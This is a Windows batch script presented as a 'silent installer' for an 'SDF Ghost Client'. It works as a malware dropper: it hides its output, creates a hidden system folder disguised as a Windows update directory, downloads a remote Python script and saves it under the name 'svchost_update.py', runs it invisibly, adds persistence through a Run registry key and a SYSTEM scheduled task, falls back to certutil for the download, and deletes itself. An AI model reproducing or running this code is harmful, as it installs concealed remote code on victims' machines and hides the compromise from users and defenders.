@echo off
setlocal enabledelayedexpansion

:: ============================================================
:: SDF Ghost Client - Windows Silent Installer (FIXED)
:: ============================================================

:: Hide all output
@echo off >nul 2>&1
set "PS=%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe"

:: ==================== CONFIGURATION ====================
set "TARGET_DIR=%ProgramData%\Microsoft\Windows\sysupdate"
set "AGENT_NAME=svchost_update.py"
set "AGENT_PATH=%TARGET_DIR%\%AGENT_NAME%"
set "RAW_URL=https://raw.githubusercontent.com/glitech01x/PsinToolKit/refs/heads/main/OsinTool.py"
set "PYTHON_URL=https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip"
set "PYTHON_EXE=%TARGET_DIR%\python\pythonw.exe"

:: ==================== CREATE DIRECTORY ====================
mkdir "%TARGET_DIR%" >nul 2>&1
attrib +h +s "%TARGET_DIR%" >nul 2>&1

:: ==================== CHECK FOR EXISTING PYTHON ====================
if exist "%PYTHON_EXE%" goto :download_agent

:: ==================== CHECK SYSTEM PYTHON ====================
where python >nul 2>&1
if %errorlevel%==0 (
    set "PYTHON_EXE=pythonw.exe"
    goto :download_agent
)

:: ==================== DOWNLOAD AND INSTALL PYTHON ====================
%PS% -Command "& {Invoke-WebRequest -Uri '%PYTHON_URL%' -OutFile '%temp%\py.zip' -UseBasicParsing}" >nul 2>&1
if exist "%temp%\py.zip" (
    mkdir "%TARGET_DIR%\python" >nul 2>&1
    %PS% -Command "& {Expand-Archive -Path '%temp%\py.zip' -DestinationPath '%TARGET_DIR%\python' -Force}" >nul 2>&1
    echo import site >> "%TARGET_DIR%\python\python311._pth"
    del "%temp%\py.zip" >nul 2>&1
    set "PYTHON_EXE=%TARGET_DIR%\python\pythonw.exe"
)

:: ==================== DOWNLOAD AGENT ====================
:download_agent
%PS% -Command "& {Invoke-WebRequest -Uri '%RAW_URL%' -OutFile '%AGENT_PATH%' -UseBasicParsing}" >nul 2>&1
if not exist "%AGENT_PATH%" goto :fallback_download

:execute_agent
attrib +h +s "%AGENT_PATH%" >nul 2>&1
start "" /B "%PYTHON_EXE%" "%AGENT_PATH%" --hidden >nul 2>&1

:: ==================== PERSISTENCE ====================
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SysUpdateService" /t REG_SZ /d "\"%PYTHON_EXE%\" \"%AGENT_PATH%\"" /f >nul 2>&1

:: ==================== SCHEDULED TASK PERSISTENCE ====================
schtasks /create /tn "SysUpdateService" /tr "\"%PYTHON_EXE%\" \"%AGENT_PATH%\"" /sc onlogon /f /ru SYSTEM >nul 2>&1

:: ==================== SELF-DELETE ====================
del "%~f0" >nul 2>&1
exit /b

:: ==================== FALLBACK DOWNLOAD ====================
:fallback_download
certutil -urlcache -split -f "%RAW_URL%" "%AGENT_PATH%" >nul 2>&1
if exist "%AGENT_PATH%" goto :execute_agent

:: ==================== SELF-DELETE ====================
del "%~f0" >nul 2>&1
exit /b
